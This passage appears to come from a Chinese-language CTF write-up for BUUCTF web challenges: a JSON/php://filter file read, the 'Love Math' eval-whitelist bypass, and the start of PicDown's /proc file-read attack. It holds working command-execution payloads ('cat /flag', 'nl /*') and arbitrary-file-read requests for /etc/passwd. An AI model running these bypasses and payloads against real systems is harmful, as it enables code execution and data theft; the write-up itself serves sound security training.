punctuation">;</span><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'content'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$content</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>有两个地方需要绕过。</p><ul><li>$body不能有非法词，但由于是json可以用unicode绕过。</li><li>$content里也不能有非法词，那就要考虑去获取已经编码过的内容。正好这里用的是file_get_contents，那就可以用伪协议去读。</li></ul><pre><code>  $content = file_get_contents($page);</code></pre><p>payload</p><pre><code>{&quot;page&quot;:&quot;\u0070\u0068\u0070://filter/convert.base64-decode/resource=/\u0066\u006c\u0061\u0067&quot;}</code></pre><p>读到，解码即可。</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20210109175907933.png" srcset="/img/loading.gif" alt="image-20210109175907933"></p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20210109175958037.png" srcset="/img/loading.gif" alt="image-20210109175958037"></p><h1 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="CISCN-2019-初赛-Love Math"></a>CISCN-2019-初赛-Love Math</h1><p>进来给了源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//例子 c=20-1</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">80</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"太长了不会算"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"请不要输入奇奇怪怪的字符"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'abs'</span><span class="token punctuation">,</span> <span class="token string">'acos'</span><span class="token punctuation">,</span> <span class="token string">'acosh'</span><span class="token punctuation">,</span> <span class="token string">'asin'</span><span class="token punctuation">,</span> <span class="token string">'asinh'</span><span class="token punctuation">,</span> <span class="token string">'atan2'</span><span class="token punctuation">,</span> <span class="token string">'atan'</span><span class="token punctuation">,</span> <span class="token string">'atanh'</span><span class="token punctuation">,</span> <span class="token string">'base_convert'</span><span class="token punctuation">,</span> <span class="token string">'bindec'</span><span class="token punctuation">,</span> <span class="token string">'ceil'</span><span class="token punctuation">,</span> <span class="token string">'cos'</span><span class="token punctuation">,</span> <span class="token string">'cosh'</span><span class="token punctuation">,</span> <span class="token string">'decbin'</span><span class="token punctuation">,</span> <span class="token string">'dechex'</span><span class="token punctuation">,</span> <span class="token string">'decoct'</span><span class="token punctuation">,</span> <span class="token string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string">'exp'</span><span class="token punctuation">,</span> <span class="token string">'expm1'</span><span class="token punctuation">,</span> <span class="token string">'floor'</span><span class="token punctuation">,</span> <span class="token string">'fmod'</span><span class="token punctuation">,</span> <span class="token string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string">'hypot'</span><span class="token punctuation">,</span> <span class="token string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string">'log10'</span><span class="token punctuation">,</span> <span class="token string">'log1p'</span><span class="token punctuation">,</span> <span class="token string">'log'</span><span class="token punctuation">,</span> <span class="token string">'max'</span><span class="token punctuation">,</span> <span class="token string">'min'</span><span class="token punctuation">,</span> <span class="token string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string">'octdec'</span><span class="token punctuation">,</span> <span class="token string">'pi'</span><span class="token punctuation">,</span> <span class="token string">'pow'</span><span class="token punctuation">,</span> <span class="token string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string">'rand'</span><span class="token punctuation">,</span> <span class="token string">'round'</span><span class="token punctuation">,</span> <span class="token string">'sin'</span><span class="token punctuation">,</span> <span class="token string">'sinh'</span><span class="token punctuation">,</span> <span class="token string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string">'srand'</span><span class="token punctuation">,</span> <span class="token string">'tan'</span><span class="token punctuation">,</span> <span class="token string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$used_funcs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$used_funcs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"请不要输入奇奇怪怪的函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//帮你算出答案</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo '</span><span class="token punctuation">.</span><span class="token variable">$content</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>对传参的限制：</p><p>①八十个字符以内</p><p>②黑名单以下字符</p><pre class=" language-php"><code class="language-php">    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>③将含有字母或‘ _ ’的字段赋值给存入$used_funcs数组，查找其是否在白名单的函数中,不存在就die掉：</p><pre class=" language-php"><code class="language-php">    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'abs'</span><span class="token punctuation">,</span> <span class="token string">'acos'</span><span class="token punctuation">,</span> <span class="token string">'acosh'</span><span class="token punctuation">,</span> <span class="token string">'asin'</span><span class="token punctuation">,</span> <span class="token string">'asinh'</span><span class="token punctuation">,</span> <span class="token string">'atan2'</span><span class="token punctuation">,</span> <span class="token string">'atan'</span><span class="token punctuation">,</span> <span class="token string">'atanh'</span><span class="token punctuation">,</span> <span class="token string">'base_convert'</span><span class="token punctuation">,</span> <span class="token string">'bindec'</span><span class="token punctuation">,</span> <span class="token string">'ceil'</span><span class="token punctuation">,</span> <span class="token string">'cos'</span><span class="token punctuation">,</span> <span class="token string">'cosh'</span><span class="token punctuation">,</span> <span class="token string">'decbin'</span><span class="token punctuation">,</span> <span class="token string">'dechex'</span><span class="token punctuation">,</span> <span class="token string">'decoct'</span><span class="token punctuation">,</span> <span class="token string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string">'exp'</span><span class="token punctuation">,</span> <span class="token string">'expm1'</span><span class="token punctuation">,</span> <span class="token string">'floor'</span><span class="token punctuation">,</span> <span class="token string">'fmod'</span><span class="token punctuation">,</span> <span class="token string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string">'hypot'</span><span class="token punctuation">,</span> <span class="token string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string">'log10'</span><span class="token punctuation">,</span> <span class="token string">'log1p'</span><span class="token punctuation">,</span> <span class="token string">'log'</span><span class="token punctuation">,</span> <span class="token string">'max'</span><span class="token punctuation">,</span> <span class="token string">'min'</span><span class="token punctuation">,</span> <span class="token string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string">'octdec'</span><span class="token punctuation">,</span> <span class="token string">'pi'</span><span class="token punctuation">,</span> <span class="token string">'pow'</span><span class="token punctuation">,</span> <span class="token string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string">'rand'</span><span class="token punctuation">,</span> <span class="token string">'round'</span><span class="token punctuation">,</span> <span class="token string">'sin'</span><span class="token punctuation">,</span> <span class="token string">'sinh'</span><span class="token punctuation">,</span> <span class="token string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string">'srand'</span><span class="token punctuation">,</span> <span class="token string">'tan'</span><span class="token punctuation">,</span> <span class="token string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>满足以上条件则放入eval执行并输出。</p><p>首先的想法肯定是通过进制转换然后构造可利用的payload。</p><h4 id="思路一-直接执行命令："><a href="#思路一-直接执行命令：" class="headerlink" title="思路一 直接执行命令："></a>思路一 直接执行命令：</h4><p>先看白名单中可以使用的函数：</p><p><strong>base_convert()</strong></p><p>测试后十进制和三十六进制之间的转换是最稳妥的，其他不好说。</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20201011190545815.png" srcset="/img/loading.gif" alt="image-20201011190545815"></p><p><strong>hexdec()</strong></p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20201014181238707.png" srcset="/img/loading.gif" alt="image-20201014181238707"></p><p>由于base_convert函数名过长， 我们将它赋到变量中，变量名选择白名单中函数名最短的，即$pi。</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20201014182357000.png" srcset="/img/loading.gif" alt="image-20201014182357000"></p><pre class=" language-php"><code class="language-php"><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token operator">=</span>base_convert<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1751504350</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span>cat f<span class="token operator">*</span><span class="token punctuation">)</span></code></pre><p>但这个函数并不能转换出像’ * ‘，’  . ‘这样的符号，先用异或构造试试。</p><p>本地用bp跑一下</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20201014214026752.png" srcset="/img/loading.gif" alt="image-20201014214026752"></p><p>也不行。</p><p>但可以用dechex函数把十进制转换为十六进制，再用异或构造一个hex2bin函数将十六进制转为字符串。</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20201014214917756.png" srcset="/img/loading.gif" alt="image-20201014214917756"></p><p>初版payload</p><pre class=" language-php"><code class="language-php"><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token operator">=</span>base_convert<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1751504350</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">37907361743</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">426836762666</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>但字符长度还是超了，超了三个。</p><p>通过fuzz进制数来缩短，把system换成exec，把cat换成nl。</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20201015143039194.png" srcset="/img/loading.gif" alt="image-20201015143039194"></p><p>实际构造</p><pre class=" language-php"><code class="language-php"><span class="token function">exec</span><span class="token punctuation">(</span>nl <span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">)</span></code></pre><p>最终payload</p><pre class=" language-php"><code class="language-php"><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token operator">=</span>base_convert<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">22950</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">1438255411</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">474260451114</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="思路二-拼接-GET传参"><a href="#思路二-拼接-GET传参" class="headerlink" title="思路二 拼接_GET传参"></a>思路二 拼接_GET传参</h4><pre><code>c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag</code></pre><p><strong>[ ]可以用{ }替代</strong></p><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>和思路一相似，也是利用进制转换</p><p>payload</p><pre class=" language-php"><code class="language-php">c<span class="token operator">=</span><span class="token variable">$pi</span><span class="token operator">=</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">37907361743</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span>$<span class="token variable">$pi</span><span class="token punctuation">)</span><span class="token punctuation">{</span>pi<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">(</span>$<span class="token variable">$pi</span><span class="token punctuation">)</span><span class="token punctuation">{</span>cos<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>pi<span class="token operator">=</span>system<span class="token operator">&amp;</span>cos<span class="token operator">=</span>cat <span class="token operator">/</span>flag </code></pre><h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>简单讲就是把白名单中给的函数与数字异或去构造_GET</p><p>脚本</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$payload</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'abs'</span><span class="token punctuation">,</span> <span class="token string">'acos'</span><span class="token punctuation">,</span> <span class="token string">'acosh'</span><span class="token punctuation">,</span> <span class="token string">'asin'</span><span class="token punctuation">,</span> <span class="token string">'asinh'</span><span class="token punctuation">,</span> <span class="token string">'atan2'</span><span class="token punctuation">,</span> <span class="token string">'atan'</span><span class="token punctuation">,</span> <span class="token string">'atanh'</span><span class="token punctuation">,</span>  <span class="token string">'bindec'</span><span class="token punctuation">,</span> <span class="token string">'ceil'</span><span class="token punctuation">,</span> <span class="token string">'cos'</span><span class="token punctuation">,</span> <span class="token string">'cosh'</span><span class="token punctuation">,</span> <span class="token string">'decbin'</span> <span class="token punctuation">,</span> <span class="token string">'decoct'</span><span class="token punctuation">,</span> <span class="token string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string">'exp'</span><span class="token punctuation">,</span> <span class="token string">'expm1'</span><span class="token punctuation">,</span> <span class="token string">'floor'</span><span class="token punctuation">,</span> <span class="token string">'fmod'</span><span class="token punctuation">,</span> <span class="token string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string">'hypot'</span><span class="token punctuation">,</span> <span class="token string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string">'log10'</span><span class="token punctuation">,</span> <span class="token string">'log1p'</span><span class="token punctuation">,</span> <span class="token string">'log'</span><span class="token punctuation">,</span> <span class="token string">'max'</span><span class="token punctuation">,</span> <span class="token string">'min'</span><span class="token punctuation">,</span> <span class="token string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string">'octdec'</span><span class="token punctuation">,</span> <span class="token string">'pi'</span><span class="token punctuation">,</span> <span class="token string">'pow'</span><span class="token punctuation">,</span> <span class="token string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string">'rand'</span><span class="token punctuation">,</span> <span class="token string">'round'</span><span class="token punctuation">,</span> <span class="token string">'sin'</span><span class="token punctuation">,</span> <span class="token string">'sinh'</span><span class="token punctuation">,</span> <span class="token string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string">'srand'</span><span class="token punctuation">,</span> <span class="token string">'tan'</span><span class="token punctuation">,</span> <span class="token string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">&lt;=</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span> <span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$i</span><span class="token punctuation">.</span><span class="token variable">$j</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"^$i$j"</span><span class="token punctuation">.</span><span class="token string">"==>$exp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20201015144829317.png" srcset="/img/loading.gif" alt="image-20201015144829317"></p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20201015144111762.png" srcset="/img/loading.gif" alt="image-20201015144111762"></p><p>payload</p><pre><code>/?c=$pi=(is_nan^(6).(4)).(tanh^(1).(5));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat /flag</code></pre><h4 id="思路三-利用getallheaders"><a href="#思路三-利用getallheaders" class="headerlink" title="思路三 利用getallheaders()"></a>思路三 利用getallheaders()</h4><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20201015151540540.png" srcset="/img/loading.gif" alt="image-20201015151540540"></p><p>因为get_allheaders返回的是数组，可以用arry[‘xxx’]的方式读取数据。</p><p>而[]和字母都被waf了，用{}替代[],头名用数字。</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20201015151653905.png" srcset="/img/loading.gif" alt="image-20201015151653905"></p><p>payload:</p><pre class=" language-php"><code class="language-php"><span class="token variable">$pi</span><span class="token operator">=</span>base_convert<span class="token punctuation">,</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">696468</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">8768397090111664438</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token number">100</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>上传头</p><pre class=" language-php"><code class="language-php"><span class="token number">100</span> cat  <span class="token operator">/</span>flag</code></pre><h1 id="2020-网鼎杯-白虎组-Web-PicDown"><a href="#2020-网鼎杯-白虎组-Web-PicDown" class="headerlink" title="2020-网鼎杯-白虎组-Web-PicDown"></a>2020-网鼎杯-白虎组-Web-PicDown</h1><p>知识点</p><pre><code>/proc/pid/cmdline 包含了用于开始进程的命令 ；/proc/pid/cwd包含了当前进程工作目录的一个链接 ；/proc/pid/environ 包含了可用进程环境变量的列表 ；/proc/pid/exe 包含了正在进程中运行的程序链接；/proc/pid/fd/ 这个目录包含了进程打开的每一个文件的链接；/proc/pid/mem 包含了进程在内存中的内容；/proc/pid/stat包含了进程的状态信息；/proc/pid/statm 包含了进程的内存使用信息。linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的信息。</code></pre><p>常规操作先扫一波再说。</p><p>什么都没有。</p><p>网页功能就是传入参数url进行文件读取。</p><p>合理怀疑存在任意文件读取或目录穿越。</p><p>试试读/etc/passwd</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20201015155007029.png" srcset="/img/loading.gif" alt="image-20201015155007029"></p><p>读/proc/self/cmdline文件查看当前进程执行命令，可以看见main.py正在执行</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20201015155226379.png" srcset="/img/loading.gif" alt="image-20201015155226379"></p><p>读下源码</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#main.py</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token keyword">import</span> os<span class="token keyword">import</span> urllibapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>SECRET_FILE <span class="token operator">=</span> <span class="token string">"/tmp/secret.txt"</span>f <span class="token operator">=</span> open<span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>SECRET_KEY <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/page'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">page</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token operator">not</span> url<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#禁了file伪协议</span>            res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            value <span class="token operator">=</span> res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            response <span class="token operator">=</span> Response<span class="token punctuation">(</span>value<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'application/octet-stream'</span><span class="token punctuation">)</span>            response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=beautiful.jpg'</span>            <span class="token keyword">return</span> response        <span class="token keyword">else</span><span class="token punctuation">:</span>            value <span class="token operator">=</span> <span class="token string">"HACK ERROR!"</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>        value <span class="token operator">=</span> <span class="token string">"SOMETHING WRONG!"</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>value<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/no_one_know_the_manager'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>SECRET_KEY<span class="token punctuation">)</span>    <span class="token keyword">if</span> key <span class="token operator">==</span> SECRET_KEY<span class="token punctuation">:</span>        shell <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>shell<span class="token punctuation">)</span>        res <span class="token operator">=</span> <span class="token string">"ok"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> <span class="token string">"Wrong Key!"</span>    <span class="token keyword">return</span> res<span class="token keyword">if</span> __name__ <span class="token 